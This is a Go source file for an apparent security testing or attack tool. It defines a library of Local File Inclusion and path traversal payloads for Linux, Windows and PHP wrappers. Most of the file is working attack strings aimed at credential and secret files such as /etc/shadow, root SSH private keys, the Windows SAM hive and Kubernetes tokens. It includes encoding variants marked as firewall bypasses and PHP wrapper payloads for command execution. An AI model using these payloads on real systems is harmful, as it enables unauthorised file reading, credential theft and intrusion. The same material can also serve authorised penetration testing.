// Package lfi provides Local File Inclusion and Path Traversal payloads.
// Payloads are categorized by:
//   - Platform (Linux, Windows, Both)
//   - Technique (Basic traversal, Null byte, Encoding, Wrapper)
//   - File type (System files, Config files, Log files)
package lfi

import "fmt"

// Platform represents the target platform.
type Platform string

const (
	PlatformLinux   Platform = "linux"
	PlatformWindows Platform = "windows"
	PlatformBoth    Platform = "both"
)

// Technique represents the traversal technique.
type Technique string

const (
	TechBasic    Technique = "basic"
	TechNullByte Technique = "nullbyte"
	TechEncoding Technique = "encoding"
	TechWrapper  Technique = "wrapper"
	TechFilter   Technique = "filter"
)

// Payload represents an LFI/Path Traversal payload.
type Payload struct {
	Value       string
	Platform    Platform
	Technique   Technique
	Description string
	WAFBypass   bool
	TargetFile  string // The target file this payload tries to read
}

// GetPayloads returns payloads for a specific platform.
func GetPayloads(platform Platform) []Payload {
	switch platform {
	case PlatformLinux:
		return linuxPayloads
	case PlatformWindows:
		return windowsPayloads
	default:
		return append(linuxPayloads, windowsPayloads...)
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(technique Technique) []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads with bypass techniques.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all LFI payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, linuxPayloads...)
	all = append(all, windowsPayloads...)
	all = append(all, wrapperPayloads...)
	return all
}

// Linux-specific LFI payloads.
// Source: PayloadsAllTheThings, HackTricks
var linuxPayloads = []Payload{
	// Basic traversal - /etc/passwd
	{Value: "/etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Direct path", TargetFile: "/etc/passwd"},
	{Value: "../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "1 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "2 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "3 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "4 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "5 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "6 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "7 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "8 level traversal", TargetFile: "/etc/passwd"},

	// Null byte injection (older PHP < 5.3.4)
	{Value: "../../../etc/passwd%00", Platform: PlatformLinux, Technique: TechNullByte, Description: "Null byte bypass", TargetFile: "/etc/passwd"},
	{Value: "../../../etc/passwd%00.jpg", Platform: PlatformLinux, Technique: TechNullByte, Description: "Null byte with extension", TargetFile: "/etc/passwd"},
	{Value: "....//....//....//etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Double dot bypass", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..././..././..././etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Dot slash bypass", TargetFile: "/etc/passwd", WAFBypass: true},

	// URL encoding
	{Value: "%2e%2e/%2e%2e/%2e%2e/etc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "URL encoded dots", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Full URL encode", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%252f..%252f..%252fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Double URL encode", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "%252e%252e%252f%252e%252e%252fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Double encoded dots", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%c0%af..%c0%afetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 overlong encoding", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%ef%bc%8f..%ef%bc%8fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 fullwidth slash", TargetFile: "/etc/passwd", WAFBypass: true},

	// Other sensitive Linux files
	{Value: "../../../etc/shadow", Platform: PlatformLinux, Technique: TechBasic, Description: "Shadow file", TargetFile: "/etc/shadow"},
	{Value: "../../../etc/hosts", Platform: PlatformLinux, Technique: TechBasic, Description: "Hosts file", TargetFile: "/etc/hosts"},
	{Value: "../../../etc/hostname", Platform: PlatformLinux, Technique: TechBasic, Description: "Hostname", TargetFile: "/etc/hostname"},
	{Value: "../../../etc/issue", Platform: PlatformLinux, Technique: TechBasic, Description: "Issue file", TargetFile: "/etc/issue"},
	{Value: "../../../etc/group", Platform: PlatformLinux, Technique: TechBasic, Description: "Group file", TargetFile: "/etc/group"},
	{Value: "../../../etc/crontab", Platform: PlatformLinux, Technique: TechBasic, Description: "Crontab", TargetFile: "/etc/crontab"},
	{Value: "../../../etc/resolv.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "DNS config", TargetFile: "/etc/resolv.conf"},
	{Value: "../../../proc/self/environ", Platform: PlatformLinux, Technique: TechBasic, Description: "Process environment", TargetFile: "/proc/self/environ"},
	{Value: "../../../proc/self/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "Process cmdline", TargetFile: "/proc/self/cmdline"},
	{Value: "../../../proc/self/fd/0", Platform: PlatformLinux, Technique: TechBasic, Description: "Process stdin", TargetFile: "/proc/self/fd/0"},
	{Value: "../../../proc/version", Platform: PlatformLinux, Technique: TechBasic, Description: "Kernel version", TargetFile: "/proc/version"},
	{Value: "../../../proc/net/tcp", Platform: PlatformLinux, Technique: TechBasic, Description: "TCP connections", TargetFile: "/proc/net/tcp"},

	// SSH keys
	{Value: "../../../root/.ssh/id_rsa", Platform: PlatformLinux, Technique: TechBasic, Description: "Root SSH key", TargetFile: "/root/.ssh/id_rsa"},
	{Value: "../../../root/.ssh/authorized_keys", Platform: PlatformLinux, Technique: TechBasic, Description: "Root authorized keys", TargetFile: "/root/.ssh/authorized_keys"},
	{Value: "../../../home/user/.ssh/id_rsa", Platform: PlatformLinux, Technique: TechBasic, Description: "User SSH key", TargetFile: "/home/user/.ssh/id_rsa"},

	// Log files
	{Value: "../../../var/log/apache2/access.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache access log", TargetFile: "/var/log/apache2/access.log"},
	{Value: "../../../var/log/apache2/error.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache error log", TargetFile: "/var/log/apache2/error.log"},
	{Value: "../../../var/log/nginx/access.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx access log", TargetFile: "/var/log/nginx/access.log"},
	{Value: "../../../var/log/nginx/error.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx error log", TargetFile: "/var/log/nginx/error.log"},
	{Value: "../../../var/log/auth.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Auth log", TargetFile: "/var/log/auth.log"},
	{Value: "../../../var/log/syslog", Platform: PlatformLinux, Technique: TechBasic, Description: "Syslog", TargetFile: "/var/log/syslog"},

	// Web config files
	{Value: "../../../var/www/html/.htaccess", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache htaccess", TargetFile: "/var/www/html/.htaccess"},
	{Value: "../../../etc/apache2/apache2.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache config", TargetFile: "/etc/apache2/apache2.conf"},
	{Value: "../../../etc/nginx/nginx.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx config", TargetFile: "/etc/nginx/nginx.conf"},
	{Value: "../../../etc/php/7.4/apache2/php.ini", Platform: PlatformLinux, Technique: TechBasic, Description: "PHP config", TargetFile: "/etc/php/7.4/apache2/php.ini"},

	// Docker
	{Value: "../../../.dockerenv", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker env file", TargetFile: "/.dockerenv"},
	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/token", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s service token", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/token"},
}

// Windows-specific LFI payloads.
// Source: PayloadsAllTheThings, HackTricks
var windowsPayloads = []Payload{
	// Basic traversal - win.ini
	{Value: "C:\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Direct path win.ini", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "..\\..\\..\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Backslash traversal", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "..\\..\\..\\..\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "4 level backslash", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "../../../Windows/win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Forward slash traversal", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "....\\....\\....\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Double dot bypass", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},

	// URL encoding Windows
	{Value: "..%5c..%5c..%5cWindows%5cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "URL encoded backslash", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},
	{Value: "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "Full URL encode", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},
	{Value: "..%255c..%255c..%255cWindows%255cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "Double URL encode", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},

	// Windows system files
	{Value: "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows hosts", TargetFile: "C:\\Windows\\System32\\drivers\\etc\\hosts"},
	{Value: "..\\..\\..\\Windows\\System32\\config\\SAM", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows SAM", TargetFile: "C:\\Windows\\System32\\config\\SAM"},
	{Value: "..\\..\\..\\Windows\\System32\\config\\SYSTEM", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows SYSTEM", TargetFile: "C:\\Windows\\System32\\config\\SYSTEM"},
	{Value: "..\\..\\..\\Windows\\repair\\SAM", Platform: PlatformWindows, Technique: TechBasic, Description: "Repair SAM", TargetFile: "C:\\Windows\\repair\\SAM"},
	{Value: "..\\..\\..\\boot.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Boot.ini", TargetFile: "C:\\boot.ini"},

	// IIS config
	{Value: "..\\..\\..\\inetpub\\wwwroot\\web.config", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS web.config", TargetFile: "C:\\inetpub\\wwwroot\\web.config"},
	{Value: "..\\..\\..\\Windows\\System32\\inetsrv\\config\\applicationHost.config", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS apphost config", TargetFile: "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"},

	// IIS logs
	{Value: "..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS logs", TargetFile: "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\"},

	// UNC paths
	{Value: "\\\\127.0.0.1\\c$\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "UNC path localhost", TargetFile: "C:\\Windows\\win.ini"},
}

// PHP wrapper payloads for LFI.
// Source: PayloadsAllTheThings, HackTricks
var wrapperPayloads = []Payload{
	// php://filter - read source code
	{Value: "php://filter/convert.base64-encode/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter base64", TargetFile: "index.php"},
	{Value: "php://filter/convert.base64-encode/resource=../../../etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "PHP filter passwd", TargetFile: "/etc/passwd"},
	{Value: "php://filter/read=string.rot13/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter rot13", TargetFile: "index.php"},
	{Value: "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter iconv", TargetFile: "index.php"},

	// php://input - POST data
	{Value: "php://input", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP input (POST body)", TargetFile: ""},

	// data:// wrapper - code injection
	{Value: "data://text/plain,<?php phpinfo();?>", Platform: PlatformBoth, Technique: TechWrapper, Description: "Data wrapper phpinfo", TargetFile: ""},
	{Value: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", Platform: PlatformBoth, Technique: TechWrapper, Description: "Data wrapper base64", TargetFile: ""},

	// expect:// - command execution
	{Value: "expect://id", Platform: PlatformLinux, Technique: TechWrapper, Description: "Expect wrapper RCE", TargetFile: ""},
	{Value: "expect://whoami", Platform: PlatformBoth, Technique: TechWrapper, Description: "Expect wrapper whoami", TargetFile: ""},

	// phar:// - deserialization
	{Value: "phar://uploads/avatar.jpg/test.txt", Platform: PlatformBoth, Technique: TechWrapper, Description: "Phar wrapper", TargetFile: ""},

	// zip:// - read from zip
	{Value: "zip://uploads/shell.jpg%23shell.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "Zip wrapper", TargetFile: ""},

	// file:// - explicit file protocol
	{Value: "file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "File protocol passwd", TargetFile: "/etc/passwd"},
	{Value: "file:///c:/Windows/win.ini", Platform: PlatformWindows, Technique: TechWrapper, Description: "File protocol win.ini", TargetFile: "C:\\Windows\\win.ini"},
}

// GenerateTraversalPayloads generates traversal payloads with variable depth.
func GenerateTraversalPayloads(targetFile string, maxDepth int) []Payload {
	var payloads []Payload
	for i := 1; i <= maxDepth; i++ {
		prefix := ""
		for j := 0; j < i; j++ {
			prefix += "../"
		}
		payloads = append(payloads, Payload{
			Value:       prefix + targetFile,
			Platform:    PlatformLinux,
			Technique:   TechBasic,
			Description: fmt.Sprintf("%d level traversal", i),
			TargetFile:  "/" + targetFile,
		})
	}
	return payloads
}
